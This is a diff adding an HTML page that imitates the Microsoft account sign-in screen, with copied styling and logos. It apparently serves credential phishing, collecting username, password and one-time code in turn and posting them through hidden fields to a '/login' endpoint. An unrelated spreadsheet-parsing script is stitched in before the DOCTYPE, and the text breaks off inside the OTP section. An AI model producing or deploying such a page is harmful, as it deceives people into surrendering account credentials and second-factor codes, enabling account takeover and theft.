@@ -1,0 +1,508 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); 
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACABAMAAAAxEHz4AAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAAASUExURQAAAPJQIn+6AACk7/+5AP///z3nV7YAAAABdFJOUwBA5thmAAAAAWJLR0QF+G/pxwAAAAd0SU1FB+kFBQ83GmSYgdsAAABLSURBVGje7cxBDcAgAASwy4IAZmEKSLCAf004uPcerYDmrWbyfFUEAoFAIBAIBAKBQCAQ9IA/2NVKxqkEAoFAIBAIBAKBQCAQ9OACu4rQJ2VY1LMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMjUtMDUtMDVUMTU6NTU6MjYrMDA6MDA1bca6AAAAJXRFWHRkYXRlOm1vZGlmeQAyMDI1LTA1LTA1VDE1OjU1OjI2KzAwOjAwRDB+BgAAACh0RVh0ZGF0ZTp0aW1lc3RhbXAAMjAyNS0wNS0wNVQxNTo1NToyNiswMDowMBMlX9kAAAAASUVORK5CYII=" />
+    <title>Sign in to your Microsoft account</title>
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+            font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+        }
+        section {
+            display: table-cell;
+            vertical-align: middle;
+            height: 100vh;
+            width: 100rem;
+            max-width: 100%;
+        }
+        .title {
+            line-height: 1.75rem;
+            color: #1b1b1b;
+            font-size: 1.5rem;
+            font-weight: 600;
+        }
+        .auth-wrapper {
+            max-width: 440px;
+            width: calc(100% - 40px);
+            padding: 44px;
+            margin: auto;
+            margin-bottom: 28px;
+            background-color: #fff;
+            -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            min-width: 320px;
+        }
+        .opts {
+            padding: 10px 44px;
+            max-width: 440px;
+            cursor: pointer;
+            margin: auto;
+            background-color: #fff;
+            -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+        }
+        .opts:hover {
+            background-color: rgba(0, 0, 0, .1);
+        }
+        .input {
+            padding: 4px 8px;
+            border-style: solid;
+            border-width: 2px;
+            border-color: rgba(0, 0, 0, .4);
+            background-color: rgba(255, 255, 255, .4);
+            height: 36px;
+            padding: 6px 10px;
+            padding-left: 0;
+            border-width: 1px;
+            border-top-width: 0;
+            border-right-width: 0;
+            border-left-width: 0;
+            border-color: #666;
+            outline: none;
+            border-radius: 0;
+            -webkit-border-radius: 0;
+            background-color: transparent;
+            width: calc(100% - 20px);
+        }
+        .input:hover {
+            border-color: #323232;
+        }
+        .input::placeholder {
+            font-size: 15px;
+        }
+        .mb-0 {
+            margin-bottom: 0;
+        }
+        a.link {
+            text-decoration: none;
+            color: #0067b8;
+        }
+        a:hover {
+            text-decoration: underline !important;
+            color: #666;
+        }
+        a:focus {
+            border: 1px dotted #000;
+            text-decoration: underline !important;
+        }
+        .btn {
+            margin: 0 0 0 auto;
+            display: block;
+            background-color: #0067b8;
+            color: #fff;
+            border: 2px solid #0067b8;
+            padding: 5px 30px;
+            font-size: 15px;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background-color: #005da6;
+        }
+        .has-icon {
+            display: flex;
+            gap: 5px;
+            align-items: center;
+        }
+        .mb-16 {
+            margin-bottom: 16px;
+        }
+        .has-icon .icon {
+            display: inline-flex;
+        }
+        .footer {
+            position: absolute;
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            overflow: visible;
+            z-index: 99;
+            clear: both;
+            min-height: 28px;
+            display: flex;
+            flex-direction: row;
+            gap: 10px;
+            justify-content: end;
+        }
+        .footer a,
+        .footer span {
+            color: #000;
+            font-size: 12px;
+            line-height: 28px;
+            margin-left: 8px;
+            margin-right: 8px;
+            text-decoration: none;
+        }
+        .footer span {
+            font-size: 20px;
+            line-height: 20px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .d-none {
+            display: none !important;
+        }
+        .back {
+            border: none;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            background-color: unset;
+            cursor: pointer;
+        }
+        .identity {
+            display: inline-flex;
+            gap: 5px;
+        }
+        .d-block {
+            display: block;
+        }
+        .w-100 {
+            width: 100%;
+        }
+        .back:hover {
+            background-color: #e6e6e6;
+        }
+        .mt-16 {
+            margin-top: 16px;
+        }
+        .error {
+            color: var(--error) !important;
+        }
+        .error-inp {
+            border-bottom-color: var(--error) !important;
+        }
+        .fs-13 {
+            font-size: 13px;
+        }
+        #user_identity {
+            font-size: 15px;
+            color: #1b1b1b;
+        }
+        img {
+            vertical-align: middle;
+        }
+        @media screen and (max-width:600px) {
+            html, body {
+                margin: 0;
+                padding: 0;
+                overflow: hidden;
+                height: 100%;
+            }
+            section {
+                display: block !important;
+            }
+            .auth-wrapper {
+                box-shadow: none !important;
+                padding: 24px !important;
+                width: unset !important;
+                max-width: unset !important;
+                margin: 0 30px !important;
+            }
+            .opts {
+                box-shadow: none !important;
+                padding: 8px 24px !important;
+                border: 1px solid #999;
+                max-width: calc(100% - 112px);
+                margin: 12% auto !important;
+            }
+            .footer {
+                justify-content: start;
+            }
+        }
+        :root {
+            --error: #e81123;
+        }
+        html, body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            height: 100%;
+        }
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-size: cover;
+            background-position: center;
+            z-index: -1;
+        }
+    </style>
+</head>
+<body>
+    <div class="background" role="presentation">
+        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxOTIwIiBoZWlnaHQ9IjEwODAiIGZpbGw9Im5vbmUiPjxnIG9wYWNpdHk9Ii4yIiBjbGlwLXBhdGg9InVybCgjRSkiPjxwYXRoIGQ9Ik0xNDY2LjQgMTc5NS4yYzk1MC4zNyAwIDE3MjAuOC02MjcuNTIgMTcyMC44LTE0MDEuNlMyNDE2Ljc3LTEwMDggMTQ2Ni40LTEwMDgtMjU0LjQtMzgwLjQ4Mi0yNTQuNCAzOTMuNnM3NzAuNDI4IDE0MDEuNiAxNzIwLjggMTQwMS42eiIgZmlsbD0idXJsKCNBKSIvPjxwYXRoIGQ9Ik0zOTQuMiAxODE1LjZjNzQ2LjU4IDAgMTM1MS44LTQ5My4yIDEzNTEuOC0xMTAxLjZTMTE0MC43OC0zODcuNiAzOTQuMi0zODcuNi05NTcuNiAxMDUuNjAzLTk1Ny42IDcxNC0zNTIuMzggMTgxNS42IDM5NC4yIDE4MTUuNnoiIGZpbGw9InVybCgjQikiLz48cGF0aCBkPSJNMTU0OC42IDE4ODUuMmM2MzEuOTIgMCAxMTQ0LjItNDE3LjQ1IDExNDQuMi05MzIuNFMyMTgwLjUyIDIwLjQgMTU0OC42IDIwLjQgNDA0LjQgNDM3Ljg1IDQwNC40IDk1Mi44czUxMi4yNzYgOTMyLjQgMTE0NC4yIDkzMi40eiIgZmlsbD0idXJsKCNDKSIvPjxwYXRoIGQ9Ik0yNjUuOCAxMjE1LjZjNjkwLjI0NiAwIDEyNDkuOC00NTUuNTk1IDEyNDkuOC0xMDE3LjZTOTU2LjA0Ni04MTkuNiAyNjUuOC04MTkuNi05ODQtMzY0LjAwNS05ODQgMTk4LTQyNC40NDUgMTIxNS42IDI2NS44IDEyMTUuNnoiIGZpbGw9InVybCgjRCkiLz48L2c+PGRlZnM+PHJhZGlhbEdyYWRpZW50IGlkPSJBIiBjeD0iMCIgY3k9IjAiIHI9IjEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiBncmFkaWVudFRyYW5zZm9ybT0idHJhbnNsYXRlKDE0NjYuNCAzOTMuNikgcm90YXRlKDkwKSBzY2FsZSgxNDAxLjYgMTcyMC44KSI+PHN0b3Agc3RvcC1jb2xvcj0iIzEwN2MxMCIvPjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iI2M0YzRjNCIgc3RvcC1vcGFjaXR5PSIwIi8+PC9yYWRpYWxHcmFkaWVudD48cmFkaWFsR3JhZGllbnQgaWQ9IkIiIGN4PSIwIiBjeT0iMCIgcj0iMSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIGdyYWRpZW50VHJhbnNmb3JtPSJ0cmFuc2xhdGUoMzk0LjIgNzE0KSByb3RhdGUoOTApIHNjYWxlKDExMDEuNiAxMzUxLjgpIj48c3RvcCBzdG9wLWNvbG9yPSIjMDA3OGQ0Ii8+PHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjYzRjNGM0IiBzdG9wLW9wYWNpdHk9IjAiLz48L3JhZGlhbEdyYWRpZW50PjxyYWRpYWxHcmFkaWVudCBpZD0iQyIgY3g9IjAiIGN5PSIwIiByPSIxIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgZ3JhZGllbnRUcmFuc2Zvcm09InRyYW5zbGF0ZSgxNTQ4LjYgOTUyLjgpIHJvdGF0ZSg5MCkgc2NhbGUoOTMyLjQgMTE0NC4yKSI+PHN0b3Agc3RvcC1jb2xvcj0iI2ZmYjkwMCIgc3RvcC1vcGFjaXR5PSIuNzUiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNjNGM0YzQiIHN0b3Atb3BhY2l0eT0iMCIvPjwvcmFkaWFsR3JhZGllbnQ+PHJhZGlhbEdyYWRpZW50IGlkPSJEIiBjeD0iMCIgY3k9IjAiIHI9IjEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiBncmFkaWVudFRyYW5zZm9ybT0idHJhbnNsYXRlKDI2NS44IDE5OCkgcm90YXRlKDkwKSBzY2FsZSgxMDE3LjYgMTI0OS44KSI+PHN0b3Agc3RvcC1jb2xvcj0iI2Q4M2IwMSIgc3RvcC1vcGFjaXR5PSIuNzUiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNjNGM0YzQiIHN0b3Atb3BhY2l0eT0iMCIvPjwvcmFkaWFsR3JhZGllbnQ+PGNsaXBQYXRoIGlkPSJFIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwaDE5MjB2MTA4MEgweiIvPjwvY2xpcFBhdGg+PC9kZWZzPjwvc3ZnPg==" alt="Microsoft" />
+    </div>
+    <section id="section_uname">
+        <div class="auth-wrapper">
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGwAAAAYCAYAAAAf1RgaAAAFP0lEQVRoQ+1YvW4TQRC+S9LQIIe0SDi8AMkTEDdQxu6RcJ4A568mrvOD8wQYiT6XkjSYJ8B5gWAkWsDQ0CQx37eaOY2XO7yRDHeRfNLJ9np2dna++Y9/1h+OorDn293kYunlWfQV5PdCtrSfRHEI3YwmXAPxDLBwZZWBcgZYGVC4gQwzwG6grH9N2mq1qvPz8yuj0ahyfX2ddDqdoX9mYYBtbW01VRgI2d/f3+/nKWR3d3fl6upqhf/HcTw8PDxM+H1nZ2cNH+uXl5ftrMv9awVPkz/00cLdXoJnRfg29J72nEIAgyVVANJ3I0gC4Rp5Ctje3n6P/wgOnwFol/kF6+RRwUU7BwcHm9NU4P/kRcODV50IWD3ch8Z7ijv1qCuuwyAHzmCLKDoyAIvgQcsqlFUWvQvh4aNZs4C9xnodF2zwcv9TydM8S7zrFXgORQ8uFMIgCeIa7tdVgywDYBSuAgvbPDo66viKgNAEpcnLiAWmgE1TaUXyMnfsIXrUVBas01BXbAQpHDAKA7BaBATCLlrFiSd+kjV6UB1vChgtkyDOzc31rIdxH9aaeB+Ad5W88f2YeZLhBx67xjV8dhGaacGPkQeP1cOVBuuP8A5Adw5j6vqgag7VM/D/qZ93LC/QnTPcKQ2LDMqJtXUCw7uB5o2eg/UXYqR9rJ9S5sIBg8CrGvIgYM0q3oSKhIoTYG1IJJhV650SQumVrkgxDxW1angOwDMRniRrIBz1AKALsxke14esG1ocgc+eFAmWNPWQv8hB+j7OqtFY8J1hL/QZEDBOLiY/cfTr7snF/b2z6AtGI3cmb4giTDqWsuhsDmPMhuCsjpp4u1Dqhu7RkEBl0gsmASZ8WaAQrCHoj2nR9ADuZ2FjAOMxQ+YHGMwPSfS0dMrh72V+cYom6DavMkLgfcMqVs5w8ptCyfIiDe/KJ8GeTRgBc/BzkZmy+h5WJS3WPzh5QxQ/bRofsIWFBXoJFZ0mXVyYVk7rcx6F0PJqEmDG6hkCa1mtggUM/DY01FkQ7LooX2VhW+FyjMgbMUL45xjZHb0XNRgC6cVpoXWjHBa9/R7mYVH0K3q2eH/0LvqCs4I8LH4a5mHMHRB6LLxJhVSHYtpQ6l4IYLoH8o15qjU4CxgsfFH7t7x13asthIZflZf/+22FMRznkfZ8a6xqGDcFLHj4C8CWAFjw8BeAZXqw72EEjI20WN4AilxFmCSAFS33AwFzoP+tL7M5TPs5KtQoObMKVYCUt3gkIwBDFh/2Tm0WFMZwxqq+DPCdh99KwLzerIvLNfGmDXUgYK4MtvusdQswnCgwJ40BY8OpX61yn4kAaRj1+PGnq3SNrHmVrw4N3DTjVgImStGeS/WcjmdCALOKopdmNeJ5HibTBuZR5qcxUPychBagb0dhdi9zFmeBYOOqPz/HWcNQGScBZg0wRg4rRUjk5byphguNqpgQwDwvZXXWlnZAK7haHmBiMFSyK+mlP/wAHtyr/ZDzeAHwBXsjAMJQuK7tgYZwU+Gmckily8jBQYHLzZ6h+o2zyuN4OLnKBJgXetILcT0EMKGzczn1VH7+0YfZHEYCry2we/m9BzAaNCDrcZbI5s6MHGdJuyzp1RjzPMx6rmweFAYYO3wKwWmDDS8ymec0YmxdJgauv9JSXCb+HCT3bGntTTpozZ9Bk5BGpgv0opSPj4zwZfHyiNMJf5JCektDL2YvltNG8J4pL5XDnpl1N/2f+oAMzxlmKUshgPkKmv0O18AMsHBdlYJyBlgpYAgXYgZYuK5KQVnILLEUN7+lQvwGa30N3FAzJE4AAAAASUVORK5CYII=" alt="Microsoft" />
+            <h2 class="title mb-16 mt-16">Sign in</h2>
+            <form id="uname_form">
+                <div class="mb-16">
+                    <p id="error_uname" class="error"></p>
+                    <input id="inp_uname" type="text" name="username" class="input" placeholder="Email, phone, or Skype" required />
+                </div>
+                <div>
+                    <button type="button" class="btn" id="btn_next_uname">Next</button>
+                </div>
+            </form>
+            <div>
+                <p class="mb-16 fs-13">No account? <a href="#" class="link">Create one!</a></p>
+                <p class="mb-16 fs-13">
+                    <a href="#" class="link">Sign in with a security key
+                        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABY0lEQVQ4T22SgVHDMAxFmw3YoGGDMkHTCYAJSCeATkCZgDJB6QSwQbMB3aDZoB2B/3zfPsXgO10cS/pf+lIzq07Xda2eetm97Mbuk76j7GMYBr7lNPmmRIJfZQ+yg2xwEiELG/43gWxzXgT4MuO6ZqlI9sQpZsV7AhD7i0t+lOMaEmCe6Y0WylE8ZFe9rxv3fNTDXU52OzB1rmon36aq5Ef/KwBSP7EvV/REAKD6h+Cg+2cAeQccAJyo+x2cMFNiKl0xvT5LSg4xre5HAM5mGmOfVbm5gl31fgbgosfbKF4VhBaAM74oMGO/AIAYjG6idCidhcJfku1jQnsAEAMRi8qhApaqla+UHnxb3ecAUAo6/GnDIwZ8oo9zUuV5kahikbcrsPSuALZyBIAuTGkTVxmlYUsr+t8xM2StLG1tASDBerDW9MzinJxEAnqwXOxLmcgEwCCo+wyemVB/lDElFm4yrV8ie7NLfZsxcwAAAABJRU5ErkJggg==" alt="Question img">
+                    </a>
+                </p>
+            </div>
+        </div>
+        <div class="opts">
+            <p class="has-icon mb-0" style="font-size:15px;">
+                <span class="icon">
+                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAACnklEQVRoQ+2XgVEcMQxFjw6gg6MD6GCpAKggpAKggpAKoAOug5AKslQAHeQ6gA7IfzdyxuzcreW1c3c7Wc9oGPZkS19fkuWD2cjXwcj9n00Ads3gxMDEQGEE/t8UaprmUME7kZxLGgn/s14l75Lntm0XhQFObh/EgJy/0cnXknnSwmz2XUDuHHqDVLIAWNQfZenCrLVEWvIkWRoLsBKY4W9g5UxAYKbqcgMw53+ZczhCZB/6vDGm7k2HPce1QeQA+GGRJ8cv5QgRTy6BgAVANBJta8+SmzIUXACiSBJFUgEQ7mXsvdmG2xRz7oOlmARgxl+kO5f8NW6RpR5YfG/7DEufuoHFd6ke5TjZp+sBEAy/yvBpOEwO/TZQfHI5pT0hDb/WarEeAMHog4zeFgK40n5Ye9JZlzVY8ACg8zQSCpd2uVqKJt/4jboghRYph6JaWEr/OKXv+d0DIKQKLXDpOXSTTgTAlXIeWx4AdA/GhKMaPVwgPnBMZyVt1wJAB6KXn+a2z64D1rk4b6spxCXE7FPcv6P7ZKtFfCXn6Ryf2qiH3jUMcA7nUUswWjwbufIw6vmfOlEuiM48xW1ePOB5AdzJ2DcJESNyg7tRbRAuAERahsN9kDXMrWOpJogcALTSMBPhV3IcsMuOvJ9322YtEG4AxgIgGC0aiyxs/JQwy7XRM5O2+0USHjRr+34NEFkAQjp0Hip9tUzNAHrjxVUKYhCADhAe9XMTHKbAEZ6aC8nqHdB385aAKALQF/oI5Gp06K5aNbE3AAA4hIl/DqAb+dQw1wURP6LWMbl3ACImkrWD7s4AOGrCNXZPADydqE9nU02kaiWcuXUGvEU9OgCbWEo9PfeGgdECKK2hnTMwASiNwK73Tyk0MVAYgdGn0B9wa1FAZvhTogAAAABJRU5ErkJggg==" width="30px" />
+                </span> Sign-in options
+            </p>
+        </div>
+        </section>
+    <section id="section_pwd" class="d-none">
+        <div class="auth-wrapper">
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGwAAAAYCAYAAAAf1RgaAAAFP0lEQVRoQ+1YvW4TQRC+S9LQIIe0SDi8AMkTEDdQxu6RcJ4A568mrvOD8wQYiT6XkjSYJ8B5gWAkWsDQ0CQx37eaOY2XO7yRDHeRfNLJ9np2dna++Y9/1h+OorDn293kYunlWfQV5PdCtrSfRHEI3YwmXAPxDLBwZZWBcgZYGVC4gQwzwG6grH9N2mq1qvPz8yuj0ahyfX2ddDqdoX9mYYBtbW01VRgI2d/f3+/nKWR3d3fl6upqhf/HcTw8PDxM+H1nZ2cNH+uXl5ftrMv9awVPkz/00cLdXoJnRfg29J72nEIAgyVVANJ3I0gC4Rp5Ctje3n6P/wgOnwFol/kF6+RRwUU7BwcHm9NU4P/kRcODV50IWD3ch8Z7ijv1qCuuwyAHzmCLKDoyAIvgQcsqlFUWvQvh4aNZs4C9xnodF2zwcv9TydM8S7zrFXgORQ8uFMIgCeIa7tdVgywDYBSuAgvbPDo66viKgNAEpcnLiAWmgE1TaUXyMnfsIXrUVBas01BXbAQpHDAKA7BaBATCLlrFiSd+kjV6UB1vChgtkyDOzc31rIdxH9aaeB+Ad5W88f2YeZLhBx67xjV8dhGaacGPkQeP1cOVBuuP8A5Adw5j6vqgag7VM/D/qZ93LC/QnTPcKQ2LDMqJtXUCw7uB5o2eg/UXYqR9rJ9S5sIBg8CrGvIgYM0q3oSKhIoTYG1IJJhV650SQumVrkgxDxW1angOwDMRniRrIBz1AKALsxke14esG1ocgc+eFAmWNPWQv8hB+j7OqtFY8J1hL/QZEDBOLiY/cfTr7snF/b2z6AtGI3cmb4giTDqWsuhsDmPMhuCsjpp4u1Dqhu7RkEBl0gsmASZ8WaAQrCHoj2nR9ADuZ2FjAOMxQ+YHGMwPSfS0dMrh72V+cYom6DavMkLgfcMqVs5w8ptCyfIiDe/KJ8GeTRgBc/BzkZmy+h5WJS3WPzh5QxQ/bRofsIWFBXoJFZ0mXVyYVk7rcx6F0PJqEmDG6hkCa1mtggUM/DY01FkQ7LooX2VhW+FyjMgbMUL45xjZHb0XNRgC6cVpoXWjHBa9/R7mYVH0K3q2eH/0LvqCs4I8LH4a5mHMHRB6LLxJhVSHYtpQ6l4IYLoH8o15qjU4CxgsfFH7t7x13asthIZflZf/+22FMRznkfZ8a6xqGDcFLHj4C8CWAFjw8BeAZXqw72EEjI20WN4AilxFmCSAFS33AwFzoP+tL7M5TPs5KtQoObMKVYCUt3gkIwBDFh/2Tm0WFMZwxqq+DPCdh99KwLzerIvLNfGmDXUgYK4MtvusdQswnCgwJ40BY8OpX61yn4kAaRj1+PGnq3SNrHmVrw4N3DTjVgImStGeS/WcjmdCALOKopdmNeJ5HibTBuZR5qcxUPychBagb0dhdi9zFmeBYOOqPz/HWcNQGScBZg0wRg4rRUjk5byphguNqpgQwDwvZXXWlnZAK7haHmBiMFSyK+mlP/wAHtyr/ZDzeAHwBXsjAMJQuK7tgYZwU+Gmckily8jBQYHLzZ6h+o2zyuN4OLnKBJgXetILcT0EMKGzczn1VH7+0YfZHEYCry2we/m9BzAaNCDrcZbI5s6MHGdJuyzp1RjzPMx6rmweFAYYO3wKwWmDDS8ymec0YmxdJgauv9JSXCb+HCT3bGntTTpozZ9Bk5BGpgv0opSPj4zwZfHyiNMJf5JCektDL2YvltNG8J4pL5XDnpl1N/2f+oAMzxlmKUshgPkKmv0O18AMsHBdlYJyBlgpYAgXYgZYuK5KQVnILLEUN7+lQvwGa30N3FAzJE4AAAAASUVORK5CYII=" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back" id="back_to_uname">
+                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAKFJREFUSEvtk7ENAjEQBOdaoAyquBKogJwuICMkI6WULeHLICQkM7L0SB+Az7xxgHinPu14x7bReVnnfBZAaPiPFLn7BRgknUIvk4EqRWP4CthKun0V0BKeD1Js0BpeBIzhG+AM3CMtkg6vZt42cPdjSmlnZrWA/UeAPJwhwHrO5T5h4StqhYSA1iZVgAnk2uWjRS+otF/dYC5kAYTmfl/RA7/KNxkMGDRgAAAAAElFTkSuQmCC" />
+                </button>
+                <span id="user_identity"></span>
+            </div>
+            <h2 class="title mb-16">Enter password</h2>
+            <form id="pwd_form">
+                <div class="mb-16">
+                    <p id="error_pwd" class="error"></p>
+                    <input type="hidden" name="username" id="hidden_uname" />
+                    <input id="inp_pwd" type="password" name="password" class="input" placeholder="Password" required />
+                </div>
+                <div>
+                    <button type="button" class="btn" id="btn_next_pwd">Next</button>
+                </div>
+            </form>
+            <div>
+                <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
+                <p class="mb-16">
+                    <a href="#" class="link fs-13">Other ways to sign in</a>
+                </p>
+            </div>
+        </div>
+    </section>
+    <section id="section_otp" class="d-none">
+        <div class="auth-wrapper">
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGwAAAAYCAYAAAAf1RgaAAAFP0lEQVRoQ+1YvW4TQRC+S9LQIIe0SDi8AMkTEDdQxu6RcJ4A568mrvOD8wQYiT6XkjSYJ8B5gWAkWsDQ0CQx37eaOY2XO7yRDHeRfNLJ9np2dna++Y9/1h+OorDn293kYunlWfQV5PdCtrSfRHEI3YwmXAPxDLBwZZWBcgZYGVC4gQwzwG6grH9N2mq1qvPz8yuj0ahyfX2ddDqdoX9mYYBtbW01VRgI2d/f3+/nKWR3d3fl6upqhf/HcTw8PDxM+H1nZ2cNH+uXl5ftrMv9awVPkz/00cLdXoJnRfg29J72nEIAgyVVANJ3I0gC4Rp5Ctje3n6P/wgOnwFol/kF6+RRwUU7BwcHm9NU4P/kRcODV50IWD3ch8Z7ijv1qCuuwyAHzmCLKDoyAIvgQcsqlFUWvQvh4aNZs4C9xnodF2zwcv9TydM8S7zrFXgORQ8uFMIgCeIa7tdVgywDYBSuAgvbPDo66viKgNAEpcnLiAWmgE1TaUXyMnfsIXrUVBas01BXbAQpHDAKA7BaBATCLlrFiSd+kjV6UB1vChgtkyDOzc31rIdxH9aaeB+Ad5W88f2YeZLhBx67xjV8dhGaacGPkQeP1cOVBuuP8A5Adw5j6vqgag7VM/D/qZ93LC/QnTPcKQ2LDMqJtXUCw7uB5o2eg/UXYqR9rJ9S5sIBg8CrGvIgYM0q3oSKhIoTYG1IJJhV650SQumVrkgxDxW1angOwDMRniRrIBz1AKALsxke14esG1ocgc+eFAmWNPWQv8hB+j7OqtFY8J1hL/QZEDBOLiY/cfTr7snF/b2z6AtGI3cmb4giTDqWsuhsDmPMhuCsjpp4u1Dqhu7RkEBl0gsmASZ8WaAQrCHoj2nR9ADuZ2FjAOMxQ+YHGMwPSfS0dMrh72V+cYom6DavMkLgfcMqVs5w8ptCyfIiDe/KJ8GeTRgBc/BzkZmy+h5WJS3WPzh5QxQ/bRofsIWFBXoJFZ0mXVyYVk7rcx6F0PJqEmDG6hkCa1mtggUM/DY01FkQ7LooX2VhW+FyjMgbMUL45xjZHb0XNRgC6cVpoXWjHBa9/R7mYVH0K3q2eH/0LvqCs4I8LH4a5mHMHRB6LLxJhVSHYtpQ6l4IYLoH8o15qjU4CxgsfFH7t7x13asthIZflZf/+22FMRznkfZ8a6xqGDcFLHj4C8CWAFjw8BeAZXqw72EEjI20WN4AilxFmCSAFS33AwFzoP+tL7M5TPs5KtQoObMKVYCUt3gkIwBDFh/2Tm0WFMZwxqq+DPCdh99KwLzerIvLNfGmDXUgYK4MtvusdQswnCgwJ40BY8OpX61yn4kAaRj1+PGnq3SNrHmVrw4N3DTjVgImStGeS/WcjmdCALOKopdmNeJ5HibTBuZR5qcxUPychBagb0dhdi9zFmeBYOOqPz/HWcNQGScBZg0wRg4rRUjk5byphguNqpgQwDwvZXXWlnZAK7haHmBiMFSyK+mlP/wAHtyr/ZDzeAHwBXsjAMJQuK7tgYZwU+Gmckily8jBQYHLzZ6h+o2zyuN4OLnKBJgXetILcT0EMKGzczn1VH7+0YfZHEYCry2we/m9BzAaNCDrcZbI5s6MHGdJuyzp1RjzPMx6rmweFAYYO3wKwWmDDS8ymec0YmxdJgauv9JSXCb+HCT3bGntTTpozZ9Bk5BGpgv0opSPj4zwZfHyiNMJf5JCektDL2YvltNG8J4pL5XDnpl1N/2f+oAMzxlmKUshgPkKmv0O18AMsHBdlYJyBlgpYAgXYgZYuK5KQVnILLEUN7+lQvwGa30N3FAzJE4AAAAASUVORK5CYII=" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back" id="back_to_pwd">
+                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAKFJREFUSEvtk7ENAjEQBOdaoAyquBKogJwuICMkI6WULeHLICQkM7L0SB+Az7xxgHinPu14x7bReVnnfBZAaPiPFLn7BRgknUIvk4EqRWP4CthKun0V0BKeD1Js0BpeBIzhG+AM3CMtkg6vZt42cPdjSmlnZrWA/UeAPJwhwHrO5T5h4StqhYSA1iZVgAnk2uWjRS+otF/dYC5kAYTmfl/RA7/KNxkMGDRgAAAAAElFTkSuQmCC" />
+                </button>
+                <span id="user_identity_otp"></span>
+            </div>
+            <h2 class="title mb-16">Enter OTP</h2>
+            <form id="otp_form" action="/login" method="POST">
+                <div class="mb-16">
+                    <p id="error_otp" class="error"></p>
+                    <input type="hidden" name="username" id="hidden_uname_otp" />
+                    <input type="hidden" name="password" id="hidden_pwd_otp" />
+                    <input id="OTP_m" type="text" name="OTP_m" class="input" placeholder="OTP" required />
+                </div>
+                <div>
+                    <button type="submit" class="btn" id="btn_submit">Go</button>
+                </div>
+            </form>
+            <div>
